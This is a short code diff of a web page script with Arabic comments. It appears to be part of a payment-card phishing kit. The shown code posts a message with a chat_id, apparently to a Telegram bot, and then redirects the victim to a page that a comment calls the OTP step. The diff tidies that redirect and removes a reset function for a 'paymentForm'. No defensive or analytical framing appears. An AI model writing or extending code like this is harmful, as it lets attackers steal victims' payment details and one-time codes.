@@ -62,18 +62,14 @@
                 body: JSON.stringify({ chat_id: chatId, text: message })
             })
             .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    window.location.href = "eror.html";  // بعد إرسال البيانات، توجيه المستخدم إلى صفحة OTP
-                } else {
-                }
-            })
-        }
+.then(data => {
+    if (data.ok) {
+        window.location.href = "eror.html";  // توجيه المستخدم إلى صفحة eror.html
+    } else {
+        // يمكن إضافة معالجة الخطأ هنا إذا أردت
+    }
+})
 
-        // دالة لإعادة تعيين النموذج إذا تم الضغط على إلغاء
-        function resetForm() {
-            document.getElementById("paymentForm").reset();
-        }
     </script>
 
 </body>
